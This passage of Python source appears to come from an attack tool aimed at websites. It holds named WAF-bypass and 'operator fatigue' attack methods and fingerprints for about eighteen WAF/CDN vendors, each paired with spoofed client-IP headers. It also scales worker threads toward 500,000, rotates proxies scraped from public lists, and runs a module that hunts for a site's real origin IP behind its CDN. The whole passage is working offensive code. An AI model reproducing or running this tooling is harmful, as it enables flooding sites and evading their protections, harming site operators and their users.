    ("WAF_CHALLENGE_BYPASS", "🛡️"), ("WAF_RATE_LIMIT_BYPASS", "🚦"),
    ("WAF_IP_ROTATION", "🌐"),
    ("OPERATOR_FATIGUE", "😵"),
]
METHOD_EMOJI = dict(METHODS)
ALL_METHOD_NAMES = [m for m, _ in METHODS]

# ============================================================================
#  WAF DB
# ============================================================================
@dataclass
class WAFFingerprint:
    name: str
    headers: List[str]
    cookies: List[str] = field(default_factory=list)
    body: List[str] = field(default_factory=list)
    cdn_ips: List[str] = field(default_factory=list)
    bypass_headers: Dict[str, str] = field(default_factory=dict)

WAF_DB: List[WAFFingerprint] = [
    WAFFingerprint(name="Cloudflare",
        headers=["cf-ray", "cf-cache-status", "cf-request-id", "server: cloudflare"],
        cookies=["__cfduid", "__cf_bm", "cf_clearance"],
        body=["Attention Required! | Cloudflare", "cf-error-details", "Ray ID"],
        cdn_ips=["104.16.0.0/12", "172.64.0.0/13", "173.245.48.0/20", "103.21.244.0/22",
                 "103.22.200.0/22", "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
                 "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22", "198.41.128.0/17",
                 "162.158.0.0/15", "131.0.72.0/22"],
        bypass_headers={"CF-Connecting-IP": "{spoof}", "True-Client-IP": "{spoof}",
                        "X-Forwarded-For": "{spoof}", "X-Real-IP": "{spoof}",
                        "X-Originating-IP": "{spoof}", "X-Remote-IP": "{spoof}",
                        "X-Remote-Addr": "{spoof}", "X-Client-IP": "{spoof}",
                        "X-Host": "{spoof}", "X-Forwarded-Host": "{spoof}"}),
    WAFFingerprint(name="Akamai",
        headers=["akamai-grn", "x-akamai-transformed", "server: akamaighost"],
        cookies=["ak_bmsc", "bm_sz", "akamai"],
        body=["Reference #", "AkamaiGHost", "Access Denied"],
        cdn_ips=["23.32.0.0/11", "23.192.0.0/11", "104.64.0.0/10", "184.24.0.0/13",
                 "96.6.0.0/15", "96.16.0.0/14", "184.50.0.0/15"],
        bypass_headers={"X-Akamai-Config-Log": "{spoof}", "X-Akamai-Edge-IP": "{spoof}",
                        "True-Client-IP": "{spoof}"}),
    WAFFingerprint(name="AWS_WAF",
        headers=["x-amzn-requestid", "x-amz-cf-id", "server: awselb", "x-amz-id-2"],
        cookies=["aws-waf-token"], body=["Request blocked", "AWS WAF"],
        cdn_ips=["52.0.0.0/8", "54.0.0.0/8", "3.0.0.0/8", "13.32.0.0/15"],
        bypass_headers={"X-Forwarded-For": "{spoof}", "X-Amzn-Trace-Id": "Root=1-{hex}"}),
    WAFFingerprint(name="Imperva",
        headers=["x-iinfo", "x-cdn: incapsula", "server: incapsula"],
        cookies=["incap_ses_", "visid_incap_", "nlbi_", "incap_ses"],
        body=["Incapsula incident ID", "_Incapsula_Resource"],
        cdn_ips=["199.83.128.0/21", "198.143.32.0/19", "149.126.72.0/21", "103.28.248.0/22"],
        bypass_headers={"X-Forwarded-For": "{spoof}", "X-Real-IP": "{spoof}"}),
    WAFFingerprint(name="Sucuri",
        headers=["x-sucuri-id", "x-sucuri-cache", "server: sucuri"],
        cookies=["sucuri_cloudproxy"],
        body=["Sucuri WebSite Firewall", "Access Denied - Sucuri"],
        cdn_ips=["192.124.249.0/24", "66.248.200.0/24"],
        bypass_headers={"X-Sucuri-Client-IP": "{spoof}", "X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="F5_BIGIP",
        headers=["x-wa-info", "server: big-ip", "x-cnection"],
        cookies=["TS01", "BIGipServer", "F5_ST", "LastMRH_Session"],
        body=["The requested URL was rejected", "Please consult with your administrator"],
        bypass_headers={"X-Forwarded-For": "{spoof}", "X-Client-IP": "{spoof}"}),
    WAFFingerprint(name="ModSecurity",
        headers=["server: mod_security", "server: modsecurity"],
        body=["ModSecurity", "Not Acceptable", "406 Not Acceptable"],
        bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="Fastly",
        headers=["x-served-by", "x-cache: fastly", "x-fastly-request-id", "fastly-io-info"],
        cookies=["_fastly"], body=["Fastly error", "unknown domain"],
        cdn_ips=["151.101.0.0/16", "199.232.0.0/16", "23.235.32.0/20"],
        bypass_headers={"Fastly-Client-IP": "{spoof}", "X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="StackPath",
        headers=["x-sp-cache", "x-stackpath"], cookies=["sp_"],
        body=["StackPath", "Request blocked"],
        bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="Barracuda",
        headers=["server: barracuda", "x-barracuda"],
        cookies=["barra_counter_session"],
        body=["Barracuda", "blocked by Barracuda"],
        bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="FortiWeb",
        headers=["server: fortiweb", "x-fw-"], cookies=["FORTIWAFSID"],
        body=["FortiWeb", "Blocked by FortiWeb"],
        bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="Azure_WAF",
        headers=["x-azure-ref", "server: microsoft-azure"],
        cookies=["ASLBSA", "ASLBSACORS"],
        body=["Azure Application Gateway", "403 Forbidden"],
        bypass_headers={"X-Forwarded-For": "{spoof}", "X-Azure-ClientIP": "{spoof}"}),
    WAFFingerprint(name="Wallarm", headers=["x-wallarm-"],
        body=["Wallarm", "wallarm"], bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="Reblaze", headers=["x-reblaze-"], cookies=["rbzid"],
        body=["Reblaze"], bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="SignalSciences", headers=["x-sigsci-"],
        body=["Signal Sciences"], bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="Radware", headers=["x-rdwr-", "server: radware"],
        body=["Radware"], bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="ArvanCloud", headers=["server: arvancloud", "ar-"],
        body=["ArvanCloud"], cdn_ips=["185.143.232.0/22", "185.204.168.0/22"],
        bypass_headers={"X-Forwarded-For": "{spoof}"}),
    WAFFingerprint(name="LiteSpeed", headers=["server: litespeed", "server: lsws"],
        body=["LiteSpeed"], bypass_headers={"X-Forwarded-For": "{spoof}"}),
]

class WAFDetector:
    def __init__(self):
        self.detected: Optional[WAFFingerprint] = None
        self.confidence = 0.0
        self._lock = threading.Lock()
    def detect_from_response(self, resp_headers, resp_body, cookies):
        hlow = {k.lower(): (v or "").lower() for k, v in resp_headers.items()}
        blow = (resp_body or b"")[:16384].decode("utf-8", "ignore").lower()
        clist = [c.lower() for c in cookies.keys()]
        best = None; best_score = 0
        for waf in WAF_DB:
            score = 0
            for h in waf.headers:
                if ":" in h:
                    k, v = h.split(":", 1)
                    if k.strip() in hlow and v.strip() in hlow[k.strip()]: score += 3
                else:
                    if h.lower() in hlow: score += 2
            for c in waf.cookies:
                for ck in clist:
                    if ck.startswith(c.lower()): score += 2; break
            for b in waf.body:
                if b.lower() in blow: score += 3
            if score > best_score: best_score = score; best = waf
        with self._lock:
            if best and best_score >= 3:
                self.detected = best
                self.confidence = min(1.0, best_score / 10.0)
                return best
        return None
    def waf_name(self):
        with self._lock: return self.detected.name if self.detected else "Unknown"
    def bypass_headers(self, spoof_ip=None):
        with self._lock:
            if not self.detected: return {}
            spoof = spoof_ip or self._rand_ip()
            out = {}
            for k, v in self.detected.bypass_headers.items():
                out[k] = v.replace("{spoof}", spoof).replace("{hex}", os.urandom(8).hex())
            return out
    @staticmethod
    def _rand_ip():
        for _ in range(20):
            ip = ipaddress.ip_address(secrets.randbits(32))
            if not (ip.is_private or ip.is_loopback or ip.is_multicast or
                    ip.is_reserved or ip.is_link_local or ip.is_unspecified):
                return str(ip)
        return "1.2.3.4"

waf_detector = WAFDetector()

# ============================================================================
#  ADAPTIVE CONTROLLER
# ============================================================================
class AdaptiveController:
    def __init__(self, initial_workers=5000, min_workers=10, max_workers=500000):
        self.lock = threading.Lock()
        self.workers = initial_workers
        self.min_workers = min_workers
        self.max_workers = max_workers
        self.cpu_pct = 0.0; self.ram_pct = 0.0
        self.ram_avail_gb = 0.0; self.net_mbps = 0.0
        self.running = False; self.thread = None
        self.interval = 1.5
        self._callback = None
        self._prev_net = None; self._prev_time = None
        self._peak_workers = initial_workers
        self._adjustments = 0
    def set_worker_callback(self, cb): self._callback = cb
    def start(self):
        if not HAS_PSUTIL: return False
        if self.running: return True
        try:
            self._prev_net = psutil.net_io_counters()
            self._prev_time = time.monotonic()
        except Exception: pass
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True, name="adaptive")
        self.thread.start()
        return True
    def _loop(self):
        try:
            psutil.cpu_percent(interval=None); time.sleep(0.5)
        except Exception: pass
        while self.running:
            try:
                cpu = psutil.cpu_percent(interval=None)
                mem = psutil.virtual_memory()
                ram_pct = mem.percent
                ram_avail = mem.available / (1024 ** 3)
                mbps = 0.0
                try:
                    net = psutil.net_io_counters()
                    if self._prev_net:
                        dt = max(0.001, time.monotonic() - self._prev_time)
                        mbps = (net.bytes_sent - self._prev_net.bytes_sent) * 8 / dt / 1e6
                    self._prev_net = net
                    self._prev_time = time.monotonic()
                except Exception: pass
                with self.lock:
                    self.cpu_pct = cpu; self.ram_pct = ram_pct
                    self.ram_avail_gb = ram_avail; self.net_mbps = mbps
                self._adjust_workers(cpu, ram_pct)
            except Exception: pass
            time.sleep(self.interval)
    def _adjust_workers(self, cpu, ram_pct):
        with self.lock:
            old = self.workers
            if cpu > 95 or ram_pct > 95: self.workers = max(self.min_workers, int(self.workers * 0.50))
            elif cpu > 88 or ram_pct > 88: self.workers = max(self.min_workers, int(self.workers * 0.70))
            elif cpu > 80 or ram_pct > 78: self.workers = max(self.min_workers, int(self.workers * 0.85))
            elif cpu > 70 or ram_pct > 70: self.workers = max(self.min_workers, int(self.workers * 0.95))
            elif cpu < 40 and ram_pct < 50: self.workers = min(self.max_workers, int(self.workers * 1.25))
            elif cpu < 25 and ram_pct < 40: self.workers = min(self.max_workers, int(self.workers * 1.50))
            if old != self.workers:
                self._adjustments += 1
                if self.workers > self._peak_workers: self._peak_workers = self.workers
                if self._callback:
                    try: self._callback(self.workers)
                    except Exception: pass
    def get_workers(self):
        with self.lock: return self.workers
    def snapshot(self):
        with self.lock:
            return {"workers": self.workers, "cpu_pct": self.cpu_pct, "ram_pct": self.ram_pct,
                    "ram_avail_gb": self.ram_avail_gb, "net_mbps": self.net_mbps,
                    "adjustments": self._adjustments, "peak_workers": self._peak_workers}
    def stop(self):
        self.running = False
        if self.thread: self.thread.join(timeout=2.0)

# ============================================================================
#  ADAPTIVE EXECUTOR
# ============================================================================
class AdaptiveExecutor:
    def __init__(self, base_threads: int, base_concurrency: int):
        self.base_threads = base_threads
        self.base_concurrency = base_concurrency
        self._executor: Optional[ThreadPoolExecutor] = None
        self._lock = threading.Lock()
    def start(self):
        with self._lock:
            if self._executor is None:
                self._executor = ThreadPoolExecutor(max_workers=self.base_threads,
                                                     thread_name_prefix="ghost")
        return self._executor
    def submit(self, fn, *a, **kw):
        with self._lock:
            if self._executor is None: self.start()
            return self._executor.submit(fn, *a, **kw)
    def stop(self):
        with self._lock:
            if self._executor:
                with suppress(Exception):
                    self._executor.shutdown(wait=False, cancel_futures=True)
                self._executor = None
    def current_concurrency(self) -> int:
        return max(50, int(self.base_concurrency * resource_gate.get()))

# ============================================================================
#  PROXY MANAGER
# ============================================================================
class ProxyType(str, Enum):
    HTTP = "http"
    HTTPS = "https"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"

@dataclass
class ProxyEntry:
    raw: str
    scheme: ProxyType
    host: str
    port: int
    user: Optional[str] = None
    password: Optional[str] = None
    alive: bool = False
    latency_ms: float = 9999.0
    success: int = 0
    fail: int = 0
    last_check: float = 0.0
    last_used: float = 0.0
    score: float = 0.0
    country: str = "??"
    def key(self) -> str: return f"{self.scheme.value}://{self.host}:{self.port}"
    def url(self) -> str:
        auth = ""
        if self.user:
            auth = f"{self.user}:{self.password}@" if self.password else f"{self.user}@"
        return f"{self.scheme.value}://{auth}{self.host}:{self.port}"
    def compute_score(self):
        total = self.success + self.fail
        if total == 0: self.score = 0.5; return
        sr = self.success / total
        lat = max(0.0, min(self.latency_ms, 5000.0)) / 5000.0
        age = time.time() - self.last_check if self.last_check else 9999
        staleness = min(age / 600.0, 1.0)
        self.score = sr * 0.7 + (1.0 - lat) * 0.2 + (1.0 - staleness) * 0.1
        if not self.alive: self.score *= 0.1

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/proxyspace/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxyspace/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/proxyspace/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
]

class ProxyManager:
    ROT_RANDOM = "random"
    ROT_RR = "round_robin"
    ROT_WEIGHTED = "weighted"
    ROT_LEAST_LATENCY = "least_latency"
    ROT_STICKY = "sticky"
    def __init__(self):
        self.proxies: Dict[str, ProxyEntry] = {}
        self.lock = threading.RLock()
        self.rr_idx = 0
        self.rotation = self.ROT_WEIGHTED
        self.sticky_map: Dict[str, ProxyEntry] = {}
        self._check_stop = False
        self._auto_reap_thread = None
        self.reap_interval = 60
        self.last_check_stats = {"alive": 0, "dead": 0, "total": 0}
    @staticmethod
    def parse_line(line: str) -> Optional[ProxyEntry]:
        line = line.strip()
        if not line or line.startswith("#"): return None
        scheme = ProxyType.HTTP
        if "://" in line:
            s, rest = line.split("://", 1)
            s = s.lower()
            if s == "http": scheme = ProxyType.HTTP
            elif s == "https": scheme = ProxyType.HTTPS
            elif s in ("socks4", "socks4a"): scheme = ProxyType.SOCKS4
            elif s in ("socks5", "socks5h", "socks"): scheme = ProxyType.SOCKS5
            else: scheme = ProxyType.HTTP
        else: rest = line
        user = pw = None
        if "@" in rest:
            auth, hp = rest.rsplit("@", 1)
            if ":" in auth: user, pw = auth.split(":", 1)
            else: user = auth
        else: hp = rest
        if ":" not in hp: return None
        host, port_s = hp.rsplit(":", 1)
        try: port = int(port_s)
        except ValueError: return None
        return ProxyEntry(raw=line, scheme=scheme, host=host, port=port, user=user, password=pw)
    def load_file(self, path: str) -> int:
        added = 0
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    e = self.parse_line(line)
                    if e:
                        with self.lock: self.proxies[e.key()] = e
                        added += 1
        except FileNotFoundError:
            logger.warning(f"Proxy file not found: {path}")
        return added
    def load_list(self, items: Iterable[str]) -> int:
        added = 0
        for line in items:
            e = self.parse_line(line)
            if e:
                with self.lock: self.proxies[e.key()] = e
                added += 1
        return added
    async def fetch_from_sources(self, timeout: float = 15.0) -> int:
        if not HAS_HTTPX: return 0
        added = 0
        try:
            async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
                for url in PROXY_SOURCES:
                    try:
                        r = await client.get(url)
                        if r.status_code == 200:
                            for line in r.text.splitlines():
                                e = self.parse_line(line)
                                if e:
                                    with self.lock: self.proxies[e.key()] = e
                                    added += 1
                    except Exception: continue
        except Exception: pass
        return added
    def clear(self):
        with self.lock:
            self.proxies.clear(); self.sticky_map.clear(); self.rr_idx = 0
    def size(self) -> int:
        with self.lock: return len(self.proxies)
    def alive_size(self) -> int:
        with self.lock: return sum(1 for p in self.proxies.values() if p.alive)
    def get(self, policy=None, sticky_key=None):
        with self.lock:
            if not self.proxies: return None
            pool = [p for p in self.proxies.values() if p.alive]
            if not pool: pool = list(self.proxies.values())
            policy = policy or self.rotation
            if policy == self.ROT_RR:
                p = pool[self.rr_idx % len(pool)]; self.rr_idx += 1; return p
            if policy == self.ROT_LEAST_LATENCY: return min(pool, key=lambda x: x.latency_ms)
            if policy == self.ROT_WEIGHTED:
                weights = [max(0.01, p.score) for p in pool]
                return random.choices(pool, weights=weights, k=1)[0]
            if policy == self.ROT_STICKY and sticky_key:
                if sticky_key in self.sticky_map:
                    p = self.sticky_map[sticky_key]
                    if p.key() in self.proxies: return p
                p = random.choice(pool); self.sticky_map[sticky_key] = p; return p
            return random.choice(pool)
    def report(self, p, ok, latency_ms=0.0):
        with self.lock:
            p.last_used = time.time()
            if ok:
                p.success += 1; p.alive = True
                if latency_ms > 0: p.latency_ms = p.latency_ms * 0.7 + latency_ms * 0.3
            else:
                p.fail += 1
                if p.fail > 5 and p.success == 0: p.alive = False
            p.compute_score()
    def _check_one(self, p, timeout=5.0):
        t0 = time.monotonic()
        try:
            if p.scheme in (ProxyType.SOCKS4, ProxyType.SOCKS5) and HAS_PYSOCKS:
                s = socks.socksocket()
                st = socks.SOCKS4 if p.scheme == ProxyType.SOCKS4 else socks.SOCKS5
                s.set_proxy(st, p.host, p.port, username=p.user, password=p.password)
                s.settimeout(timeout); s.connect(("1.1.1.1", 80)); s.close()
                return True, (time.monotonic() - t0) * 1000
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout); s.connect((p.host, p.port))
            req = b"CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\n"
            if p.user:
                cred = base64.b64encode(f"{p.user}:{p.password or ''}".encode()).decode()
                req += f"Proxy-Authorization: Basic {cred}\r\n".encode()
            req += b"User-Agent: Mozilla/5.0\r\n\r\n"
            s.send(req); data = s.recv(512); s.close()
            ok = b"200" in data.split(b"\r\n", 1)[0]
            return ok, (time.monotonic() - t0) * 1000
        except Exception:
            return False, (time.monotonic() - t0) * 1000
    def check_all(self, threads=1000, timeout=5.0):
        with self.lock: items = list(self.proxies.values())
        if not items: return 0, 0
        alive = dead = 0
        lock = threading.Lock()
        def worker(p):
            nonlocal alive, dead
            ok, lat = self._check_one(p, timeout)
            with self.lock:
                p.last_check = time.time()
                if ok:
                    p.alive = True; p.success += 1; p.latency_ms = lat
                    p.compute_score()
                    with lock: alive += 1
                else:
                    p.fail += 1
                    if p.fail >= 3: p.alive = False
                    p.compute_score()
                    with lock: dead += 1
        with ThreadPoolExecutor(max_workers=threads) as ex:
            list(ex.map(worker, items))
        self.last_check_stats = {"alive": alive, "dead": dead, "total": len(items)}
        return alive, dead
    def start_auto_reap(self):
        if self._auto_reap_thread and self._auto_reap_thread.is_alive(): return
        self._check_stop = False
        self._auto_reap_thread = threading.Thread(target=self._reap_loop, daemon=True, name="proxy-reap")
        self._auto_reap_thread.start()
    def stop_auto_reap(self): self._check_stop = True
    def _reap_loop(self):
        while not self._check_stop:
            time.sleep(self.reap_interval)
            try:
                with self.lock:
                    to_del = [k for k, p in self.proxies.items()
                              if (not p.alive) and p.fail > 10 and (time.time() - p.last_used) > 300]
                    for k in to_del: del self.proxies[k]
                with self.lock:
                    sample = random.sample(list(self.proxies.values()), min(100, len(self.proxies)))
                for p in sample:
                    ok, lat = self._check_one(p, timeout=4.0)
                    with self.lock:
                        p.last_check = time.time(); p.alive = ok
                        if ok:
                            p.success += 1; p.latency_ms = p.latency_ms * 0.7 + lat * 0.3
                        else: p.fail += 1
                        p.compute_score()
            except Exception: pass
    def stats(self):
        with self.lock:
            n = len(self.proxies)
            alive = sum(1 for p in self.proxies.values() if p.alive)
            by_proto = defaultdict(int)
            lat_vals = []
            for p in self.proxies.values():
                by_proto[p.scheme.value] += 1
                if p.alive and p.latency_ms < 9000: lat_vals.append(p.latency_ms)
            return {"total": n, "alive": alive, "by_protocol": dict(by_proto),
                    "avg_latency_ms": statistics.mean(lat_vals) if lat_vals else 0.0,
                    "rotation": self.rotation}

proxy_manager = ProxyManager()

# ============================================================================
#  ORIGIN IP DISCOVERY
# ============================================================================
COMMON_SUBDOMAINS = [
    "mail", "dev", "staging", "origin", "cpanel", "webmail", "direct",
    "backend", "api", "admin", "portal", "test", "stage", "prod",
    "server", "host", "vpn", "ftp", "sftp", "ssh", "db", "database",
    "app", "mobile", "m", "www2", "web", "ns1", "ns2", "dns", "mx",
    "cdn", "static", "assets", "media", "img", "images", "files",
    "blog", "shop", "store", "secure", "login", "auth", "sso",
]

class OriginIPDiscovery:
    def __init__(self, domain, timeout=10.0):
        self.domain = domain.lower().strip()
        self.timeout = timeout
        self.results: Dict[str, Set[str]] = defaultdict(set)
        self.subdomains: Set[str] = set()
        self.apikeys: Dict[str, str] = {}
        self._lock = threading.Lock()
    def _load_keys(self, path="ghost_proxies/api_keys.json"):
        if os.path.exists(path):
            with suppress(Exception):
                with open(path) as f: self.apikeys = json.load(f)
    async def _get_text(self, sess, url, params=None, headers=None):
        try:
            async with sess.get(url, params=params, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=self.timeout), ssl=False) as r:
                if r.status == 200: return await r.text(errors="ignore")
        except Exception: pass
        return ""
    async def _get_json(self, sess, url, params=None, headers=None):
        try:
            async with sess.get(url, params=params, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=self.timeout), ssl=False) as r:
                if r.status == 200: return await r.json(content_type=None)
        except Exception: pass
        return None
    def _add_ip(self, ip, source):
        try: ipaddress.ip_address(ip)
        except ValueError: return
        with self._lock:
            self.results[ip].add(source)
    async def src_crtsh(self, sess):
        data = await self._get_json(sess, f"https://crt.sh/?q=%25.{self.domain}&output=json")
        if isinstance(data, list):
            for row in data:
                for k in ("name_value", "common_name"):
                    v = row.get(k, "")
                    for sub in v.split("\n"):
                        sub = sub.strip().lstrip("*.")
                        if sub.endswith(self.domain): self.subdomains.add(sub)
    async def src_hackertarget(self, sess):
        txt = await self._get_text(sess, "https://api.hackertarget.com/hostsearch/", params={"q": self.domain})
        for line in txt.splitlines():
            parts = line.split(",")
            if len(parts) >= 2:
                self.subdomains.add(parts[0]); self._add_ip(parts[1], "hackertarget")
    async def src_rapiddns(self, sess):
        txt = await self._get_text(sess, f"https://rapiddns.io/subdomain/{self.domain}?full=1")
        for m in re.finditer(r">([a-zA-Z0-9_.\-]+\.%s)<" % re.escape(self.domain), txt):
            self.subdomains.add(m.group(1))
        for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", txt):
            self._add_ip(m.group(1), "rapiddns")
    async def src_urlscan(self, sess):
        data = await self._get_json(sess, "https://urlscan.io/api/v1/search/",
                                    params={"q": f"domain:{self.domain}", "size": 100})
        if data and "results" in data:
            for r in data["results"]:
                ip = r.get("page", {}).get("ip")
                if ip: self._add_ip(ip, "urlscan")
    async def src_otx(self, sess):
        data = await self._get_json(sess, f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns")
        if data and "passive_dns" in data:
            for row in data["passive_dns"]:
                hostname = row.get("hostname", "")
                if hostname.endswith(self.domain): self.subdomains.add(hostname)
                addr = row.get("address")
                if addr: self._add_ip(addr, "otx")
    async def src_threatminer(self, sess):
        data = await self._get_json(sess, "https://api.threatminer.org/v2/domain.php",
                                    params={"q": self.domain, "rt": 2})
        if data and "results" in data:
            for ip in data["results"]: self._add_ip(ip, "threatminer")
        data2 = await self._get_json(sess, "https://api.threatminer.org/v2/domain.php",
                                     params={"q": self.domain, "rt": 5})
        if data2 and "results" in data2:
            for sub in data2["results"]: self.subdomains.add(sub)
    async def src_viewdns(self, sess):
        txt = await self._get_text(sess, "https://viewdns.info/iphistory/", params={"domain": self.domain})
        for m in re.finditer(r"<td>(\d{1,3}(?:\.\d{1,3}){3})</td>", txt):
            self._add_ip(m.group(1), "viewdns")
    async def src_certspotter(self, sess):
        data = await self._get_json(sess,
            f"https://api.certspotter.com/v1/issuances?domain={self.domain}&include_subdomains=true&expand=dns_names")
        if isinstance(data, list):
            for row in data:
                for n in row.get("dns_names", []):
                    n = n.lstrip("*.")
                    if n.endswith(self.domain): self.subdomains.add(n)
    async def src_commoncrawl(self, sess):
        idx = await self._get_text(sess, "https://index.commoncrawl.org/collinfo.json")
        if not idx: return
        try: colls = json.loads(idx)
        except Exception: return
        if not colls: return
        coll = colls[0].get("id")
        txt = await self._get_text(sess, f"https://index.commoncrawl.org/{coll}-index",
                                   params={"url": f"*.{self.domain}/*", "output": "json", "limit": 100})
        for line in txt.splitlines():
            with suppress(Exception):
                row = json.loads(line)
                host = urllib.parse.urlparse(row.get("url", "")).hostname
                if host and host.endswith(self.domain): self.subdomains.add(host)
    async def src_virustotal(self, sess):
        key = self.apikeys.get("virustotal")
        if not key: return
        data = await self._get_json(sess,
            f"https://www.virustotal.com/api/v3/domains/{self.domain}/resolutions",
            headers={"x-apikey": key})
        if data and "data" in data:
            for row in data["data"]:
                ip = row.get("attributes", {}).get("ip_address")
                if ip: self._add_ip(ip, "virustotal")
    async def src_shodan(self, sess):
        key = self.apikeys.get("shodan")
        if not key: return
        data = await self._get_json(sess, f"https://api.shodan.io/dns/domain/{self.domain}",
                                    params={"key": key})
        if data:
            for sub in data.get("subdomains", []): self.subdomains.add(f"{sub}.{self.domain}")
            for rec in data.get("data", []):
                v = rec.get("value")
                if v: self._add_ip(v, "shodan")
    async def src_securitytrails(self, sess):
        key = self.apikeys.get("securitytrails")
        if not key: return
        data = await self._get_json(sess,
            f"https://api.securitytrails.com/v1/history/{self.domain}/dns/a",
            headers={"APIKEY": key})
        if data:
            for rec in data.get("records", []):
                for v in rec.get("values", []):
                    ip = v.get("ip")
                    if ip: self._add_ip(ip, "securitytrails")
    async def src_wayback(self, sess):
        txt = await self._get_text(sess,
            f"http://web.archive.org/cdx/search/cdx?url=*.{self.domain}/*&output=json&limit=2000&fl=original")
        with suppress(Exception):
            data = json.loads(txt)
            for row in data[1:]:
                if row:
                    try:
                        host = urlparse(row[0]).hostname
                        if host and self.domain in host: self.subdomains.add(host)
                    except Exception: continue
    async def src_anubis(self, sess):
        data = await self._get_json(sess, f"https://jldc.me/anubis/subdomains/{self.domain}")
        if isinstance(data, list):
            for sub in data: self.subdomains.add(sub)
    async def src_bruteforce(self, sess):
        for w in COMMON_SUBDOMAINS:
            host = f"{w}.{self.domain}"
            try:
                loop = asyncio.get_event_loop()
                infos = await loop.getaddrinfo(host, None, family=socket.AF_INET)
                for *_, sa in infos:
                    self._add_ip(sa[0], "bruteforce"); self.subdomains.add(host)
            except Exception: continue
    async def src_spf_extract(self, sess):
        if not HAS_DNSPY: return
        try:
            answers = dns.resolver.resolve(self.domain, "TXT")
            for rdata in answers:
                for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', str(rdata)):
                    self._add_ip(ip, "spf")
        except Exception: pass
    async def run(self, use_proxy=False, concurrency=20):
        conn = aiohttp.TCPConnector(ssl=False, limit=concurrency)
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        async with aiohttp.ClientSession(connector=conn, headers=headers) as sess:
            tasks = [self.src_crtsh(sess), self.src_hackertarget(sess), self.src_rapiddns(sess),
                     self.src_urlscan(sess), self.src_otx(sess), self.src_threatminer(sess),
                     self.src_viewdns(sess), self.src_certspotter(sess), self.src_commoncrawl(sess),
                     self.src_virustotal(sess), self.src_shodan(sess), self.src_securitytrails(sess),
                     self.src_wayback(sess), self.src_anubis(sess), self.src_bruteforce(sess),
                     self.src_spf_extract(sess)]
            await asyncio.gather(*tasks, return_exceptions=True)
        async def _resolve(sub):
            try:
                loop = asyncio.get_event_loop()
                infos = await loop.getaddrinfo(sub, None, family=socket.AF_INET)
                for *_, sa in infos: self._add_ip(sa[0], "resolve")
            except Exception: pass
        await asyncio.gather(*[_resolve(s) for s in list(self.subdomains)[:300]], return_exceptions=True)
        domain_ips = set()
        with suppress(Exception):
            for *_, sa in socket.getaddrinfo(self.domain, None, family=socket.AF_INET):
                domain_ips.add(sa[0])
        cdn_nets = []
        for waf in WAF_DB:
            for c in waf.cdn_ips:
                with suppress(Exception): cdn_nets.append(ipaddress.ip_network(c))
        def is_cdn(ip):
            try: a = ipaddress.ip_address(ip)
            except ValueError: return False
            for n in cdn_nets:
                if a in n: return True
            return False
        candidate_origin = []
        for ip, srcs in self.results.items():
            if ip in domain_ips: continue
            if is_cdn(ip): continue
            candidate_origin.append((ip, sorted(srcs)))
